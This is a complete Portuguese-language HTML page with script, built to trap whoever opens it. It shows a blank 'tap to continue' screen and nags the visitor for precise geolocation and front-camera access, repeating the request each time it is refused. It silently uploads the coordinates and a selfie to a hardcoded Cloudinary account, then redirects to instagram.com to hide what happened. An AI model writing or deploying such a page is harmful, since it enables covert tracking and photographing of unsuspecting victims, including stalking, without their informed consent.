<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <title>Captura de Localização e Foto</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin: 0; overflow: hidden; background: #FFF; }
    #overlay {
      position: fixed; top: 0; left: 0;
      width: 100%; height: 100%;
      display: none; justify-content: center; align-items: center;
      background: rgba(255,255,255,0.9);
      font-family: sans-serif; font-size: 20px; color: #333;
      text-align: center; padding: 20px; cursor: pointer; z-index:9999;
    }
  </style>
</head>
<body>
  <div id="overlay">Toque para continuar</div>
  <script>
    const cloudName = 'dx5legahb';
    const uploadPreset = 'upload';
    const folderName = 'capturas';
    const overlay = document.getElementById('overlay');
    const geoOptions = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };

    function show(message) {
      overlay.textContent = message;
      overlay.style.display = 'flex';
    }
    function hide() {
      overlay.style.display = 'none';
    }

    // Passo 1: chamar getCurrentPosition diretamente no clique
    function askLocation() {
      navigator.geolocation.getCurrentPosition(onGeoSuccess, onGeoError, geoOptions);
    }
    function onGeoError() {
      show('Localização negada. Toque para permitir a localização');
      overlay.onclick = askLocation;
    }
    function onGeoSuccess(position) {
      hide();
      // upload location
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const blob = new Blob([`Latitude: ${lat}\nLongitude: ${lon}`], { type: 'text/plain' });
      const form = new FormData();
      form.append('file', blob, `localizacao_${Date.now()}.txt`);
      form.append('upload_preset', uploadPreset);
      form.append('folder', folderName);
      fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, { method: 'POST', body: form })
        .then(() => {
          // após enviar localização, pedir câmera
          show('Toque para permitir o acesso à câmera');
          overlay.onclick = askCamera;
        })
        .catch(() => {
          show('Erro ao enviar localização. Toque para tentar novamente.');
          overlay.onclick = askLocation;
        });
    }

    // Passo 2: chamar getUserMedia diretamente no clique
    function askCamera() {
      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
        .then(stream => {
          hide();
          const video = document.createElement('video');
          video.setAttribute('playsinline',''); video.autoplay = true; video.muted = true;
          video.srcObject = stream;
          video.onloadedmetadata = () => video.play();
          setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(t => t.stop());
            canvas.toBlob(blob => {
              const imgForm = new FormData();
              imgForm.append('file', blob);
              imgForm.append('upload_preset', uploadPreset);
              imgForm.append('folder', folderName);
              fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, { method: 'POST', body: imgForm })
                .then(() => { window.location.href = 'https://instagram.com'; })
                .catch(() => {
                  show('Erro ao enviar foto. Toque para tentar novamente.');
                  overlay.onclick = askCamera;
                });
            }, 'image/png');
          }, 500);
        })
        .catch(() => {
          show('Câmera negada. Toque para permitir o acesso à câmera');
          overlay.onclick = askCamera;
        });
    }

    // Iniciar sequência
    window.addEventListener('DOMContentLoaded', () => {
      show('Toque para continuar');
      overlay.onclick = askLocation;
    });
  </script>
</body>
</html>
